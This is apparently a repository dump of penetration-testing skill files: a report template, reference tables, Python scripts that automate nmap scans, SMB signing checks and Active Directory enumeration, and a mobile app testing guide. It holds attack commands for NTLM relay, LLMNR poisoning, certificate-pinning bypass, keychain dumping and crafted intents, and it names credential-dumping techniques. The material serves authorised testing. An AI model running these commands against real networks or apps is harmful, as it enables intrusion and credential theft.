      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/assets/template.md =====
# Internal Network Penetration Test — Report Template

## Document Control

| Field | Value |
|-------|-------|
| Client | [Client Name] |
| Assessment Type | Internal Network Penetration Test |
| Access Model | Assumed Breach / Unauthenticated |
| Test Period | [Start] — [End] |
| Classification | CONFIDENTIAL |

---

## 1. Executive Summary

### Scope
- **Subnet(s):** [Internal ranges]
- **Domain:** [AD domain]
- **Starting Position:** [Network drop location / VPN / credentials provided]

### Key Findings

| Severity | Count | Example |
|----------|-------|---------|
| Critical | [N] | Domain compromise via credential relay |
| High | [N] | Kerberoastable service accounts with weak passwords |
| Medium | [N] | SMB signing disabled on file servers |
| Low | [N] | Excessive share permissions |

### Attack Path Summary
[Describe the primary attack chain from initial access to domain compromise]

---

## 2. Technical Findings

### Finding [N]: [Title]

| Attribute | Detail |
|-----------|--------|
| Severity | [Critical/High/Medium/Low] |
| CVSS v3.1 | [Score] |
| MITRE ATT&CK | [Technique ID] |
| Affected Assets | [Hosts/accounts] |

**Description:** [Details]
**Steps to Reproduce:** [Steps]
**Evidence:** [Screenshots/logs]
**Remediation:** [Fix]

---

## 3. Recommendations Priority

| Priority | Action | Timeline |
|----------|--------|----------|
| P1 | Disable LLMNR/NBT-NS, enable SMB signing | 1 week |
| P2 | Deploy LAPS, implement tiered admin | 30 days |
| P3 | Enforce strong password policy | 30 days |
| P4 | Review share permissions | 60 days |

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/references/api-reference.md =====
# Internal Network Penetration Test — API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| ldap3 | `pip install ldap3` | LDAP queries for AD enumeration |
| impacket | `pip install impacket` | SMB relay, credential dumping, lateral movement tools |
| python-nmap | `pip install python-nmap` | Python wrapper for nmap scanning |

## Key Tools & Commands

| Tool | Command | Purpose |
|------|---------|---------|
| nmap | `nmap -sV -sC --top-ports 1000 <target>` | Service version and script scan |
| Responder | `responder -I eth0 -A` | LLMNR/NBT-NS poisoning (analyze mode) |
| CrackMapExec | `cme smb <target> --gen-relay-list` | Find hosts with SMB signing disabled |
| BloodHound | `bloodhound-python -d domain -u user -p pass` | AD attack path mapping |
| ntlmrelayx | `ntlmrelayx.py -t <target> -smb2support` | NTLM relay attack |

## Common Internal Vulnerabilities

| Vulnerability | Impact | CVSS |
|--------------|--------|------|
| SMB signing disabled | NTLM relay attacks | 7.5 |
| LLMNR/NBT-NS enabled | Credential capture | 7.0 |
| Default credentials | Unauthorized access | 9.0 |
| Unpatched EternalBlue (MS17-010) | Remote code execution | 9.8 |
| Kerberoasting-eligible SPNs | Offline password cracking | 7.5 |

## Windows Event IDs for Detection

| Event ID | Description |
|----------|-------------|
| 4625 | Failed logon attempt (brute force indicator) |
| 4648 | Logon with explicit credentials |
| 4768 | Kerberos TGT request |
| 4769 | Kerberos service ticket request |

## External References

- [nmap Reference Guide](https://nmap.org/book/man.html)
- [ldap3 Documentation](https://ldap3.readthedocs.io/)
- [impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/references/standards.md =====
# Standards — Internal Network Penetration Testing

## Frameworks
- PTES: http://www.pentest-standard.org/
- OSSTMM v3: https://www.isecom.org/OSSTMM.3.pdf
- NIST SP 800-115: https://csrc.nist.gov/publications/detail/sp/800-115/final
- MITRE ATT&CK Enterprise: https://attack.mitre.org/matrices/enterprise/

## Key MITRE ATT&CK Techniques for Internal Testing

| Tactic | Technique | ID |
|--------|-----------|----|
| Discovery | Network Service Discovery | T1046 |
| Credential Access | LLMNR/NBT-NS Poisoning | T1557.001 |
| Credential Access | Kerberoasting | T1558.003 |
| Credential Access | OS Credential Dumping | T1003 |
| Lateral Movement | Remote Services: SMB | T1021.002 |
| Lateral Movement | Pass the Hash | T1550.002 |
| Privilege Escalation | Domain Policy Modification | T1484 |
| Collection | Data from Network Shared Drive | T1039 |

## Compliance Requirements

| Standard | Internal Pentest Requirement |
|----------|----------------------------|
| PCI DSS v4.0 | Req 11.4.2 — Internal penetration testing annually |
| ISO 27001 | A.18.2.3 — Technical compliance review |
| SOC 2 | CC7.1 — Detection and monitoring |
| NIST CSF | PR.IP-12, DE.CM |

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/references/workflows.md =====
# Workflows — Internal Network Penetration Testing

## Attack Flow

```
Network Access (Ethernet/VPN)
    │
    ├── Network Discovery (Nmap, ARP scan)
    │
    ├── Credential Capture (Responder, mitm6)
    │       │
    │       └── Hash Cracking (Hashcat)
    │
    ├── AD Enumeration (BloodHound, LDAP)
    │       │
    │       ├── Kerberoasting
    │       ├── AS-REP Roasting
    │       └── GPP Password Extraction
    │
    ├── Lateral Movement (PsExec, WMI, WinRM)
    │       │
    │       └── Credential Harvesting (Mimikatz, LSASS dump)
    │
    ├── Privilege Escalation
    │       │
    │       ├── Local (unquoted paths, token impersonation)
    │       └── Domain (DCSync, Golden Ticket, ADCS)
    │
    └── Impact Demonstration
            ├── Sensitive data access
            ├── Domain compromise proof
            └── Attack path documentation
```

## Evidence Collection Workflow

```
evidence/
├── credentials/
│   ├── responder_captures/
│   ├── cracked_hashes/
│   └── dumped_creds/
├── screenshots/
├── bloodhound/
│   └── domain_data.json
├── scan_results/
│   ├── nmap/
│   └── shares/
└── attack_paths/
    └── path_documentation.md
```

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
"""Internal network penetration testing agent using nmap and impacket."""

import json
import argparse
import subprocess
import socket
from datetime import datetime


def run_nmap_scan(target, scan_type="quick"):
    """Run nmap network discovery and port scanning."""
    scan_args = {
        "quick": ["-sV", "-sC", "--top-ports", "100", "-T4"],
        "full": ["-sV", "-sC", "-p-", "-T3"],
        "stealth": ["-sS", "-Pn", "-T2", "--top-ports", "1000"],
    }
    args = scan_args.get(scan_type, scan_args["quick"])
    cmd = ["nmap"] + args + ["-oX", "-", target]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return {"status": "completed", "output": result.stdout[:2000]}
    except FileNotFoundError:
        return {"status": "error", "message": "nmap not installed"}
    except subprocess.TimeoutExpired:
        return {"status": "timeout"}


def check_smb_signing(target):
    """Check if SMB signing is required on target hosts."""
    cmd = ["nmap", "--script", "smb2-security-mode", "-p", "445", target]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        signing_disabled = "not required" in result.stdout.lower()
        return {
            "target": target,
            "smb_signing_required": not signing_disabled,
            "vulnerable_to_relay": signing_disabled,
            "severity": "HIGH" if signing_disabled else "INFO",
        }
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return {"target": target, "error": "nmap scan failed"}


def check_llmnr_nbns(interface="eth0"):
    """Check for LLMNR/NBT-NS poisoning opportunities."""
    return {
        "check": "LLMNR/NBT-NS",
        "tool": "Responder",
        "command": f"responder -I {interface} -A",
        "risk": "Cleartext credential capture via name resolution poisoning",
        "severity": "HIGH",
        "mitigation": "Disable LLMNR via GPO, disable NBT-NS in network adapter settings",
    }


def enumerate_ad_info(dc_ip, domain, username, password):
    """Enumerate Active Directory information via LDAP."""
    try:
        import ldap3
        server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=f"{domain}\\{username}",
                                password=password, authentication=ldap3.NTLM, auto_bind=True)
        base_dn = ",".join([f"DC={p}" for p in domain.split(".")])
        conn.search(base_dn, "(objectClass=computer)", attributes=["cn", "operatingSystem"])
        computers = [{"name": str(e.cn), "os": str(e.operatingSystem)} for e in conn.entries]
        conn.search(base_dn, "(&(objectClass=user)(adminCount=1))",
                     attributes=["sAMAccountName"])
        admins = [str(e.sAMAccountName) for e in conn.entries]
        conn.unbind()
        return {"computers": computers[:20], "admin_accounts": admins, "total_hosts": len(computers)}
    except Exception as e:
        return {"error": str(e)}


def check_common_vulns(target):
    """Check for common internal network vulnerabilities."""
    checks = []
    for port, service in [(21, "FTP"), (23, "Telnet"), (80, "HTTP"), (3389, "RDP"),
                          (5900, "VNC"), (1433, "MSSQL"), (3306, "MySQL")]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            sock.connect((target, port))
            checks.append({"port": port, "service": service, "status": "open"})
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass
        finally:
            sock.close()
    return checks


def run_pentest(target, dc_ip=None, domain=None, username=None, password=None):
    """Execute internal network penetration test."""
    print(f"\n{'='*60}")
    print(f"  INTERNAL NETWORK PENETRATION TEST")
    print(f"  Target: {target}")
    print(f"  Generated: {datetime.utcnow().isoformat()} UTC")
    print(f"{'='*60}\n")

    ports = check_common_vulns(target)
    print(f"--- OPEN PORTS ({len(ports)}) ---")
    for p in ports:
        print(f"  Port {p['port']}/{p['service']}: {p['status']}")

    smb = check_smb_signing(target)
    print(f"\n--- SMB SIGNING ---")
    print(f"  Signing required: {smb.get('smb_signing_required', 'N/A')}")
    print(f"  Relay vulnerable: {smb.get('vulnerable_to_relay', 'N/A')}")

    llmnr = check_llmnr_nbns()
    print(f"\n--- LLMNR/NBT-NS ---")
    print(f"  Risk: {llmnr['risk']}")
    print(f"  Severity: {llmnr['severity']}")

    ad_info = {}
    if dc_ip and domain and username and password:
        ad_info = enumerate_ad_info(dc_ip, domain, username, password)
        print(f"\n--- AD ENUMERATION ---")
        print(f"  Total hosts: {ad_info.get('total_hosts', 0)}")
        print(f"  Admin accounts: {ad_info.get('admin_accounts', [])}")

    return {"ports": ports, "smb": smb, "llmnr": llmnr, "ad": ad_info}


def main():
    parser = argparse.ArgumentParser(description="Internal Network Pentest Agent")
    parser.add_argument("--target", required=True, help="Target IP or CIDR range")
    parser.add_argument("--dc-ip", help="Domain controller IP for AD enumeration")
    parser.add_argument("--domain", help="AD domain name")
    parser.add_argument("--username", help="AD username")
    parser.add_argument("--password", help="AD password")
    parser.add_argument("--output", help="Save report to JSON file")
    args = parser.parse_args()

    report = run_pentest(args.target, args.dc_ip, args.domain, args.username, args.password)
    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/scripts/process.py =====
#!/usr/bin/env python3
"""
Internal Network Penetration Test — Automation Process

Automates network discovery, AD enumeration, and reporting for internal pentests.
Requires: nmap, netexec, ldap3, bloodhound-python.

Usage:
    python process.py --subnet 10.0.0.0/24 --domain corp.local --dc-ip 10.0.0.5 --output ./results
"""

import subprocess
import json
import os
import sys
import argparse
import socket
import datetime
from pathlib import Path
from typing import Optional


def run_command(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
    """Execute a shell command and return stdout, stderr, return code."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Command not found: {cmd[0]}", -1


def discover_hosts(subnet: str, output_dir: Path) -> list[str]:
    """Discover live hosts on the internal network."""
    print(f"[*] Discovering live hosts on {subnet}...")
    output_file = output_dir / "host_discovery"

    stdout, stderr, rc = run_command(
        ["nmap", "-sn", subnet, "-oA", str(output_file)], timeout=600
    )

    live_hosts = []
    gnmap = f"{output_file}.gnmap"
    if os.path.exists(gnmap):
        with open(gnmap) as f:
            for line in f:
                if "Status: Up" in line:
                    ip = line.split(" ")[1]
                    live_hosts.append(ip)

    hosts_file = output_dir / "live_hosts.txt"
    with open(hosts_file, "w") as f:
        f.write("\n".join(live_hosts))

    print(f"[+] Found {len(live_hosts)} live hosts")
    return live_hosts


def port_scan(hosts_file: str, output_dir: Path) -> dict:
    """Run port scan against discovered hosts."""
    print("[*] Running port scan on live hosts...")
    output_prefix = str(output_dir / "port_scan")

    stdout, stderr, rc = run_command(
        ["nmap", "-sS", "-sV", "-T4", "--top-ports", "1000",
         "-iL", hosts_file, "-oA", output_prefix],
        timeout=3600
    )

    return {"output_prefix": output_prefix, "return_code": rc}


def enumerate_smb_shares(hosts: list[str], username: str, password: str,
                          domain: str, output_dir: Path) -> list[dict]:
    """Enumerate SMB shares across internal hosts."""
    print("[*] Enumerating SMB shares...")
    results = []

    for host in hosts:
        stdout, stderr, rc = run_command(
            ["netexec", "smb", host, "-u", username, "-p", password,
             "-d", domain, "--shares"],
            timeout=30
        )
        if rc == 0 and stdout:
            results.append({"host": host, "output": stdout})

    output_file = output_dir / "smb_shares.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    print(f"[+] Enumerated shares on {len(results)} hosts")
    return results


def check_smb_signing(hosts: list[str], output_dir: Path) -> list[dict]:
    """Check SMB signing status on discovered hosts."""
    print("[*] Checking SMB signing status...")
    results = []

    for host in hosts:
        stdout, stderr, rc = run_command(
            ["netexec", "smb", host, "--gen-relay-list",
             str(output_dir / "relay_targets.txt")],
            timeout=30
        )
        if "signing:False" in stdout:
            results.append({"host": host, "smb_signing": False})
        elif "signing:True" in stdout:
            results.append({"host": host, "smb_signing": True})

    output_file = output_dir / "smb_signing.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    unsigned = [r for r in results if not r.get("smb_signing")]
    print(f"[+] Found {len(unsigned)} hosts without SMB signing")
    return results


def run_bloodhound_collection(username: str, password: str,
                                domain: str, dc_ip: str,
                                output_dir: Path) -> str:
    """Run BloodHound data collection."""
    print("[*] Running BloodHound collection...")
    stdout, stderr, rc = run_command(
        ["bloodhound-python", "-u", username, "-p", password,
         "-d", domain, "-ns", dc_ip, "-c", "all",
         "--output-prefix", str(output_dir / "bloodhound")],
        timeout=600
    )

    if rc == 0:
        print("[+] BloodHound data collected successfully")
    else:
        print(f"[-] BloodHound collection issue: {stderr[:200]}")

    return str(output_dir)


def check_password_policy(domain: str, dc_ip: str, username: str,
                           password: str) -> dict:
    """Retrieve domain password policy."""
    print("[*] Retrieving domain password policy...")
    stdout, stderr, rc = run_command(
        ["netexec", "smb", dc_ip, "-u", username, "-p", password,
         "-d", domain, "--pass-pol"],
        timeout=30
    )

    return {"output": stdout, "return_code": rc}


def generate_report(live_hosts: list[str], smb_results: list[dict],
                     signing_results: list[dict], output_dir: Path) -> str:
    """Generate internal pentest summary report."""
    print("[*] Generating report...")
    report_file = output_dir / "internal_pentest_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    with open(report_file, "w") as f:
        f.write("# Internal Network Penetration Test Report\n\n")
        f.write(f"**Generated:** {timestamp}\n\n---\n\n")

        f.write("## Network Discovery\n\n")
        f.write(f"Total live hosts: **{len(live_hosts)}**\n\n")

        f.write("## SMB Share Analysis\n\n")
        f.write(f"Hosts with accessible shares: **{len(smb_results)}**\n\n")

        f.write("## SMB Signing Status\n\n")
        unsigned = [r for r in signing_results if not r.get("smb_signing")]
        f.write(f"Hosts without SMB signing: **{len(unsigned)}** (vulnerable to relay)\n\n")
        if unsigned:
            f.write("| Host | SMB Signing |\n|------|------------|\n")
            for r in unsigned:
                f.write(f"| {r['host']} | Disabled |\n")
            f.write("\n")

        f.write("## Recommendations\n\n")
        f.write("1. Enable SMB signing on all domain-joined systems via GPO\n")
        f.write("2. Disable LLMNR and NBT-NS across the domain\n")
        f.write("3. Implement LAPS for unique local admin passwords\n")
        f.write("4. Deploy tiered admin model for Active Directory\n")
        f.write("5. Enforce strong password policy (14+ characters)\n")
        f.write("6. Use Group Managed Service Accounts (gMSA)\n\n")

    print(f"[+] Report generated: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(description="Internal Network Pentest Automation")
    parser.add_argument("--subnet", required=True, help="Target subnet (CIDR)")
    parser.add_argument("--domain", required=True, help="AD domain name")
    parser.add_argument("--dc-ip", required=True, help="Domain controller IP")
    parser.add_argument("--username", default="", help="Domain username")
    parser.add_argument("--password", default="", help="Domain password")
    parser.add_argument("--output", default="./results", help="Output directory")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print("=" * 60)
    print(" Internal Network Penetration Test")
    print(f" Subnet: {args.subnet}")
    print(f" Domain: {args.domain}")
    print("=" * 60)

    live_hosts = discover_hosts(args.subnet, output_dir)
    port_scan(str(output_dir / "live_hosts.txt"), output_dir)

    smb_results = []
    signing_results = check_smb_signing(live_hosts[:50], output_dir)

    if args.username and args.password:
        smb_results = enumerate_smb_shares(
            live_hosts[:50], args.username, args.password, args.domain, output_dir
        )
        run_bloodhound_collection(
            args.username, args.password, args.domain, args.dc_ip, output_dir
        )
        check_password_policy(args.domain, args.dc_ip, args.username, args.password)

    generate_report(live_hosts, smb_results, signing_results, output_dir)
    print("\n[+] Internal pentest automation complete")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-mobile-app-penetration-test/SKILL.md =====
---
name: conducting-mobile-app-penetration-test
description: 'Conducts penetration testing of iOS and Android mobile applications
  following the OWASP Mobile Application Security Testing Guide (MASTG) to identify
  vulnerabilities in data storage, network communication, authentication, cryptography,
  and platform-specific security controls. The tester performs static analysis of
  application binaries, dynamic analysis at runtime, and API security testing to evaluate
  the complete mobile attack surface. Activates for requests involving mobile app
  pentest, iOS security assessment, Android security testing, or OWASP MASTG assessment.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- mobile-pentest
- OWASP-MASTG
- Android-security
- iOS-security
- mobile-application-security
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_ai_rmf:
- MEASURE-2.7
- MAP-5.1
- MANAGE-2.4
atlas_techniques:
- AML.T0070
- AML.T0066
- AML.T0082
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1426
- T1409
- T1521.003
- T1633
- T1417
- T1422
---
# Conducting Mobile App Penetration Test

## When to Use

- Testing mobile applications before release to identify security vulnerabilities and data protection issues
- Conducting compliance assessments against OWASP MASVS (Mobile Application Security Verification Standard) levels L1 and L2
- Evaluating the security of mobile banking, healthcare, or government applications handling sensitive data
- Testing mobile apps that interact with backend APIs to assess the end-to-end security of the mobile ecosystem
- Assessing mobile application resistance to reverse engineering, tampering, and runtime manipulation

**Do not use** against mobile applications without written authorization from the application owner, for distributing modified or repackaged applications, or for testing apps on the public app stores without a separate test build.

## Prerequisites

- Target application IPA (iOS) and APK (Android) files or access to download from a private distribution channel
- Rooted Android device or emulator (Genymotion, Android Studio AVD) with Frida, Objection, and Magisk installed
- Jailbroken iOS device or Corellium virtual device with Frida, Objection, and SSL Kill Switch installed
- Static analysis tools: jadx (Android decompilation), Hopper/Ghidra (iOS binary analysis), MobSF (automated scanning)
- Burp Suite Professional configured as proxy for intercepting mobile app traffic with CA certificate installed on the test device


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Static Analysis

Analyze the application binary without executing it:

**Android Static Analysis:**
- Decompile the APK: `jadx -d output/ target.apk` to obtain Java/Kotlin source code
- Review `AndroidManifest.xml` for exported components (activities, services, receivers, content providers), permissions, and debuggable flag
- Search for hardcoded secrets: `grep -rn "api_key\|password\|secret\|token\|aws_" output/`
- Identify insecure data storage patterns: SharedPreferences with sensitive data, SQLite databases without encryption, files in external storage
- Check for WebView vulnerabilities: `setJavaScriptEnabled(true)`, `addJavascriptInterface()`, and loading untrusted content
- Run MobSF automated scan: `python manage.py runserver` and upload the APK for automated static analysis

**iOS Static Analysis:**
- Extract the IPA and locate the Mach-O binary
- Use `otool -L <binary>` to list linked frameworks and identify third-party libraries
- Analyze with Ghidra or Hopper for hardcoded URLs, API endpoints, and embedded credentials
- Check Info.plist for App Transport Security (ATS) exceptions that allow insecure HTTP connections
- Review embedded entitlements for excessive capabilities

### Step 2: Network Security Testing

Intercept and analyze all network communications:

- Configure Burp Suite as proxy on the test device and install the Burp CA certificate
- Exercise all application functionality while Burp captures API traffic
- **SSL/TLS validation**: Verify the app validates server certificates properly. If the app fails to connect through the proxy, it may implement certificate pinning.
- **Certificate pinning bypass**:
  - Android: Use Frida script: `frida -U -f com.target.app -l ssl-pinning-bypass.js --no-pause`
  - iOS: Use SSL Kill Switch or Objection: `objection -g "Target App" explore --startup-command "ios sslpinning disable"`
- **API traffic analysis**: Review all API calls for:
  - Sensitive data transmitted without encryption
  - Authentication tokens in URL parameters (visible in logs)
  - Excessive data in API responses beyond what the UI displays
  - Missing or weak authentication on API endpoints
- **WebSocket and custom protocols**: Check for non-HTTP communication channels that may bypass standard proxy interception

### Step 3: Data Storage Analysis

Test for insecure local data storage:

**Android Data Storage:**
- Access app data directory: `/data/data/com.target.app/`
- Check SharedPreferences XML files for stored credentials, tokens, and PII
- Examine SQLite databases: `sqlite3 /data/data/com.target.app/databases/*.db ".dump"`
- Check for sensitive data in application logs: `logcat -d | grep -i "password\|token\|key"`
- Verify that application data is excluded from backups: `android:allowBackup="false"` in AndroidManifest.xml
- Check clipboard for sensitive data leakage

**iOS Data Storage:**
- Examine the Keychain for stored credentials: `objection -g "Target App" explore` then `ios keychain dump`
- Check NSUserDefaults/plist files: `find /var/mobile/Containers/Data/Application/ -name "*.plist" -exec plutil -p {} \;`
- Inspect SQLite databases and Core Data stores for unencrypted sensitive data
- Check for data leaking through screenshots (iOS captures screenshots during app backgrounding)
- Verify data protection class: sensitive files should use NSFileProtectionComplete

### Step 4: Authentication and Session Management

Test mobile-specific authentication controls:

- **Biometric bypass**: Test if biometric authentication can be bypassed by hooking the authentication callback with Frida to always return success
- **Token storage**: Verify that authentication tokens are stored in the Keychain (iOS) or Android Keystore, not in SharedPreferences or files
- **Session timeout**: Verify that sessions expire after a reasonable idle timeout and that tokens are invalidated server-side on logout
- **Root/jailbreak detection bypass**: Test if the app detects rooted/jailbroken devices and if the detection can be bypassed with Frida or Magisk Hide
- **Deep link abuse**: Test if custom URL schemes or universal links can be used to bypass authentication or access restricted functionality

### Step 5: Runtime Manipulation

Test the application's resistance to runtime attacks:

- **Frida hooking**: Use Frida to hook and modify application functions at runtime:
  - Bypass root detection: hook the detection function to return false
  - Modify return values of authentication checks
  - Intercept encryption functions to capture plaintext data before encryption
  - Bypass certificate pinning by hooking SSL verification
- **Method swizzling** (iOS): Use Frida to replace Objective-C method implementations
- **Intent manipulation** (Android): Send crafted intents to exported components: `adb shell am start -n com.target.app/.InternalActivity -e "user_id" "admin"`
- **Tampering detection**: Modify the APK/IPA (add code, change resources), re-sign, and install. Verify whether the app detects tampering.

## Key Concepts

| Term | Definition |
|------|------------|
| **OWASP MASTG** | Mobile Application Security Testing Guide; comprehensive manual for mobile app security testing covering both iOS and Android platforms |
| **Certificate Pinning** | A mobile security control that restricts which TLS certificates the app trusts, preventing man-in-the-middle attacks through proxy interception |
| **Frida** | Dynamic instrumentation toolkit that allows injection of JavaScript into running processes to hook functions, modify behavior, and bypass security controls |
| **Root/Jailbreak Detection** | Application-level checks to detect if the device has been modified to grant root access, typically blocking app usage on compromised devices |
| **Android Keystore** | Hardware-backed credential storage on Android that protects cryptographic keys and secrets from extraction even on rooted devices |
| **App Transport Security (ATS)** | iOS security feature that enforces HTTPS connections by default; ATS exceptions may indicate insecure network communication |
| **Deep Links** | URL schemes that open specific screens within a mobile application, which may bypass normal navigation and authentication flows if not properly validated |

## Tools & Systems

- **Frida / Objection**: Dynamic instrumentation tools for hooking functions, bypassing security controls, and manipulating application behavior at runtime
